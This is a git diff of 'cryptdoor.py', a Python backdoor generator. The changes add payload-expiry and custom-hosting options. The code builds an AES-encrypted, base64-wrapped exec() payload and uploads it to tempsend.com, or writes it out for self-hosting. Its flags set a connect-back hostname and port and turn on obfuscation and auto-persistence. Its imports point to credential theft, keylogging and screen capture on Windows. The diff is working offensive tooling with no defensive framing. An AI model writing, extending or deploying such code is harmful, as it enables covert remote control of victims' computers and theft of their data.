@@ -35,20 +35,14 @@ def fxor(s1):
 
 def ftempsend(ufile):
 	with open(ufile, 'rb') as uf:
-		r = requests.post("http://tempsend.com/send", data={'expire':'2678400'}, files={'file': uf})
+		r = requests.post("http://tempsend.com/send", data={'expire':expire}, files={'file': uf})
 	return str(r.url)
-
-# def ftempsend(ufile):
-# 	with open(ufile, 'rb') as uf:
-# 		r = requests.post("http://tempsend.com/send", data={'expire':'2678400'}, files={'file': uf})
-# 	for line in str(r.url).split('\n'):
-# 		if 'right-click' in line:
-# 			return 'http://tempsend.com' + line.split('"')[1]
-# 			break
 
 parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
 parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
-parser.add_argument("-p", "--port", type=str, help="Port.")
+parser.add_argument("-p", "--port", type=str, help="Port to connect back to.")
+parser.add_argument("-e", "--expire", type=str, help="Payload Life: h=hour, d=day, w=week, m=month")
+parser.add_argument("-u", "--customurl", type=str, help="Host the generated code.txt at this url.")
 parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of backdoor source code.')
 parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
 parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
@@ -60,10 +54,29 @@ if len(sys.argv) == 1:
 	parser.print_help()
 	exit()
 
+if not args.customurl and not args.expire:
+	print ' [X] Error: Missing expire or customurl flag.'
+	parser.print_help()
+	exit()
+
+if args.expire:
+	expiredone = False
+	extimes = [['h',3600], ['d',86400], ['w',604800], ['m',2678400]]
+	for e in extimes:
+		if args.expire == e[0]:
+			expire = e[1]
+			expiredone = True
+			break
+	if not expiredone:
+		print ' [X] Error: Missing or invalid expire flag value: ' + args.expire
+		parser.print_help()
+		exit()
+
 if args.hostname and args.port:
 	hostname = args.hostname
 	portnumber = args.port
 else:
+	print ' [X] Error: Missing hostname or port flag.'
 	parser.print_help()
 	exit()
 
@@ -136,10 +149,19 @@ else:
 cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,payload)))
-with open('readme.txt', 'wb') as df:
-	df.write(downpayload)
-downurl = ftempsend('readme.txt')
-os.remove('readme.txt')
+
+if not args.customurl:
+	with open('readme.txt', 'wb') as df:
+		df.write(downpayload)
+	print ' [<] Uploading payload code to tempsend..'
+	downurl = ftempsend('readme.txt')
+	print ' [*] Code uploaded to ' + downurl
+	os.remove('readme.txt')
+else:
+	with open('code.txt', 'wb') as lf:
+		lf.write(downpayload)
+	print ' [V] Payload code written to code.txt'
+	print ' [V] Expecting it to be hosted at ' + args.customurl
 
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
